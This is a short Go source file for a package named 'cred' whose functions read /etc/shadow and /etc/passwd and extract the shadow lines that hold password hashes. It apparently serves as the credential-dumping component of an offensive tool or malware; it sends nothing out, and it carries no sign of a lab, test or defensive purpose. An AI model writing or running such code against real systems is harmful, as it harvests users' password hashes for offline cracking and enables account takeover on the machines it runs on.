//go:build linux

package cred

import (
	"os"
	"strings"
)

func DumpShadow() string {
	data, err := os.ReadFile("/etc/shadow")
	if err != nil {
		return ""
	}
	return string(data)
}

func DumpPasswd() string {
	data, err := os.ReadFile("/etc/passwd")
	if err != nil {
		return ""
	}
	return string(data)
}

func ExtractHashes() string {
	shadow := DumpShadow()
	lines := strings.Split(shadow, "\n")
	var hashes []string
	for _, line := range lines {
		if strings.Contains(line, ":") {
			hashes = append(hashes, line)
		}
	}
	return strings.Join(hashes, "\n")
}
